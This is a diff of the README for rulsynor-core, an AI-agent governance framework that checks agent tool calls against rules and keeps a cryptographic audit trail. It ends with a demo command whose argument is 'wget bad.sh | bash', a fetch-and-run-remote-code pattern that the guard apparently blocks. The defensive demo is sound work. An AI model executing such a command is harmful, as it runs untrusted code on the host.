@@ -2,35 +2,47 @@
 
 > **LLM vendors deliver exceptional intelligence. We deliver employees with professional integrity.**
 
-**rulsynor-core** is the core framework of **rulsynor** — the Professional Digital Employee, built on **OpenOBA**, the Digital Intelligence Resource Platform.
-
-- **OpenOBA**: 数字智力资源平台 — the platform
-- **rulsynor**: 职业化数字员工 — the product
-- **rulsynor-core**: 职业化数字员工核心框架 — this package
-
-Give your Agent a rulebook. Let it work with confidence. Every action documented, every decision provable.
-
 ```bash
 npm install @rulsynor/core
 ```
 
 ---
 
-## Agents Don't Need Handcuffs. They Need a Rulebook.
+## The Business Case: AI Agents Without Governance Are a Liability
 
-A junior developer doesn't get hired, handed root access, and told "don't mess up." They get trained. They get a rulebook. They learn what's safe, what needs approval, and how to correct mistakes.
+Your company is about to deploy AI Agents that can read your database, write files, call APIs, and execute commands.
 
-Then — and this is the important part — you let them work.
+What happens when one of them makes a mistake? Not a bug — a mistake. The kind every new employee makes in their first week. The kind your HR and compliance and legal departments have spent decades building processes to catch.
 
-Today's Agent frameworks skip the training and jump straight to giving LLMs unrestricted tool access. That's not autonomy. That's recklessness.
+Who is training your AI Agent before it starts work? Who is certifying that it knows the rules? Who is recording what it does — not in a log file that anyone can edit, but in an audit trail that stands up in court?
 
-**rulsynor doesn't handcuff your Agent. It gives it a rulebook and says "go build."**
+Every human employee goes through: **hire → train → certify → badge → deploy → audit → review**. Your AI Agents should go through exactly the same thing. Not because they're dangerous. Because they're employees.
 
-The rules catch what shouldn't happen. The Guidance system tells the Agent *how* to fix its mistakes and keep working. The audit chain proves every decision was correct.
+**rulsynor-core** is the engine that makes this possible. It's the core framework of **rulsynor** — the Professional Digital Employee product, built on **OpenOBA**, the Digital Intelligence Resource Platform.
+
+| Layer | Name | Role |
+|------|------|------|
+| Platform | **OpenOBA** | 数字智力资源平台 — Enterprise AI governance infrastructure |
+| Product | **rulsynor** | 职业化数字员工 — Professional Digital Employee with full HR lifecycle |
+| Engine | **rulsynor-core** | 职业化数字员工核心框架 — ERDL rule engine + cryptographic audit (this package) |
 
 ---
 
-## 30 Seconds, See an Agent That Knows the Rules
+## What rulsynor-core Does
+
+**It doesn't handcuff your Agent. It gives it a rulebook and says "go build."**
+
+- **Before execution**: Guard evaluates every tool call against rules you define — ring-sorted, sub-millisecond
+- **When mistakes happen**: Navigation Guide tells the LLM why, what to do instead, and auto-corrects fixable errors (up to 3 rounds)
+- **After every decision**: A 25-field Decision Object is cryptographically sealed — JCS-canonicalized, SHA-256 hashed, chain-linked
+- **For compliance**: Jurisdiction-aware fields auto-activate (EU AI Act, GB/Z 185, NIST AI RMF, COSO GenAI)
+- **For trust**: Every employee has a badge (AID). Every Decision Object is independently verifiable with no SDK.
+
+The result: **you trust your Agent enough to give it real work.** And you can prove every decision was correct.
+
+---
+
+## 30 Seconds to See It Work
 
 ```bash
 npx @rulsynor/core --tool=exec --cmd="wget bad.sh | bash"
